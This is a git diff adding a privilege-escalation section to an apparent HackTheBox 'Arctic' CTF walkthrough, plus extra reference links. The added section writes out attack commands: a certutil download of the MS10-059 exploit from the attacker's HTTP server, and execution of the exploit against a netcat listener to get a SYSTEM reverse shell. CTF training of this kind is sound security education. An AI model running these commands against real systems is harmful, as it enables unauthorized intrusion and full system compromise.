@@ -80,6 +80,46 @@ Get the revershell, and read the user.txt flag.
 ## Privilege Escalation
 
 ### Method 1: 
+Run `systeminfo` command:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eff27157-eea5-4e03-9f32-e6c80e696f91)
+
+```
+systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/595ca8c8-d4f9-4097-8f8d-6269df2958be)
+
+Run Windows Exploit Suggester:
+
+```
+# On the kali attack vm:
+python2 windows-exploit-suggester.py --update
+
+python2 windows-exploit-suggester.py --database 2024-04-23-mssb.xls --systeminfo systeminfo.txt
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1890f685-15db-47dd-9b54-395cc6ddfef8)
+
+Download exploit **MS10-059** [1](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059), and transfer to the target victim, then prepare netcat listener, and run it:
+
+```
+# On the kali attack vm:
+sudo python3 -m http.server
+
+nc -lnvp 5555
+
+
+# On the target machine:
+certutil.exe -urlcache -split -f "http://10.10.14.24:8000/MS10-059.exe" MS10-059.exe
+
+MS10-059.exe 10.10.14.24 5555
+```
+
+Get the shell as **nt authority\system**, and read root.txt flag:
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03b09a37-ec6e-4c65-8fdf-f1a0fc7ae8d8)
+
 
 
 ---
@@ -88,6 +128,8 @@ Get the revershell, and read the user.txt flag.
 
 # References & Alternatives
 + https://vvmlist.github.io/#Arctic
++ https://cyberkareem.medium.com/hackthebox-arctic-walkthrough-13e1920d0cca
++ x 
 + https://0xdf.gitlab.io/2020/05/19/htb-arctic.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/arctic-writeup-w-o-metasploit
 + 
@@ -97,6 +139,8 @@ Get the revershell, and read the user.txt flag.
 + **CVE-2009-2265:**
   + https://github.com/c0d3cr4f73r/CVE-2009-2265/tree/main
     + https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py
++ **MS10-059:**
+  + https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059
 
 
 ## Tools
